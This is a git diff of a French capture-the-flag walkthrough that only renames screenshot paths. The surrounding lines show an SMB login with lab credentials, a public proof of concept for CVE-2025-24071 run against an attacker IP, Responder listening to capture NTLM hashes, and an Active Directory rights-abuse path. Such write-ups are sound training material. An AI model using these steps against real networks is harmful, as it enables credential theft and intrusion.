@@ -73,7 +73,7 @@ domain :
 
 Conection smb anonyme authorise
 
-![](/assets/Pasted image 20260728220702.png)
+![](/assets/Pasted-image-20260728220702.png)
 
 Utilisation des creds fournis pour se connecter au partage SMB 
 
@@ -81,11 +81,11 @@ Utilisation des creds fournis pour se connecter au partage SMB
 smbclient //10.129.232.88/it --user 'j.fleischman' --password 'J0elTHEM4n1990!'
 ```
 
-![](/assets/Pasted image 20260728224210.png)
+![](/assets/Pasted-image-20260728224210.png)
 
 D'apres le ficher `pdf` recu nous pouvons appercevoir ce systeme est affecter par certains `cve`
 
-![](/assets/Pasted image 20260728230849.png)
+![](/assets/Pasted-image-20260728230849.png)
 
 En fesant des recherches sur chacun d'eux j'ai pu m'appercevoir que celui `CVE-2025-24071` est applicable rapidement dans notre cas ici
 
@@ -96,7 +96,7 @@ PoC : https://www.exploit-db.com/exploits/52310
 python3 explo.py -i 10.10.14.117 -n hacker -o file --keep
 ```
 
-![](/assets/Pasted image 20260728231032.png)
+![](/assets/Pasted-image-20260728231032.png)
 
 ### Ecoute avec Responder
 
@@ -104,7 +104,7 @@ python3 explo.py -i 10.10.14.117 -n hacker -o file --keep
 sudo responder  -I tun0
 ```
 
-![](/assets/Pasted image 20260728231119.png)
+![](/assets/Pasted-image-20260728231119.png)
 
 ## Creds
 
@@ -154,7 +154,7 @@ p.agila --(MemberOf)--> Service Account Managers --(GenericAll)--> Service Accou
 - Le groupe **`Service Accounts`** dispose du droit **`GenericWrite`** sur l'utilisateur **`WinRM_SVC`**
 
 
-![](/assets/Pasted image 20260728235126.png)
+![](/assets/Pasted-image-20260728235126.png)
 
 ### Ajout de l'user au groupe Service Accounts
 
